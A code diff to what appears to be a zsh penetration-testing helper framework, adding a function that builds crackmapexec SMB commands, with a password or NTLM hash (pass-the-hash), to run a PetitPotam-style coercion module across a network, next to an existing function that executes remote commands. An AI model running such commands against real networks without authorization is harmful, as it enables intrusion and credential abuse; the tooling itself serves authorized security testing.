@@ -37,6 +37,7 @@ Other Commands - With Authentication
 nb-ad-enum-ldapdomaindump       enumerate with ldapdomaindump
 nb-ad-enum-bloodhound           enumerate with bloodhound
 nb-ad-enum-cme-pass-auth        pass the password/hash
+nb-ad-enum-cme-petipotam-auth   use crackmapexec petipotam module
 nb-ad-enum-cme-command-auth     the password/hash and execute command
 
 DOC
@@ -373,6 +374,40 @@ nb-ad-enum-cme-command-auth() {
         __ask "Enter the NTLM hash for authentication"
         __check-hash
         print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x $cm | tee $(__netadpath)/cme-command-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
+nb-ad-enum-cme-petipotam-auth() {
+    __check-project
+    nb-vars-set-network
+    nb-vars-set-user
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        __ask "Do you want to add a domain? (y/n)"
+        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+        if [[ $add_domain == "y" ]]; then
+            __ask "Enter the domain"
+            nb-vars-set-domain
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M petipotam | tee $(__netadpath)/cme-sweep.txt"
+        else
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M petipotam | tee $(__netadpath)/cme-sweep.txt"
+        fi
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M petipotam | tee $(__netadpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
